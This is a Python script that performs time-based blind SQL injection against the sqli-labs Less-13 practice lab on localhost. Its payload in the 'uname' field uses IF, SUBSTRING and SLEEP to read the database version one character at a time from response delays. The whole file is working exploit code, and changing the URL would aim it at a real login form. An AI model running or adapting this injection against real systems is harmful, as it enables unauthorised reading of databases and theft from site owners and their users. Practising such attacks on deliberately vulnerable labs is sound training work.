import requests
import string
import time

url = "http://127.0.0.1/sqli-labs/Less-13/"
delay_threshold = 3

def payload(char, position):
    return f"') OR IF(SUBSTRING(version(),{position},1)='{char}',SLEEP(4),1)-- "

def send_request(char, position):
    data = {
        "uname": payload(char, position),
        "passwd": "123"
    }
    start = time.time()
    requests.post(url, data=data)
    end = time.time()    
    return (end - start) > delay_threshold

def extract_version():
    version = ""
    charset = string.digits + "." 
    for position in range(1, 20):
        found = False
        for char in charset:
            print(f"Test the char {char} with position {position}")
            if send_request(char, position):
                version += char
                found = True
                break
        if not found:
            break
        
    print(f"Database version: {version}")
extract_version()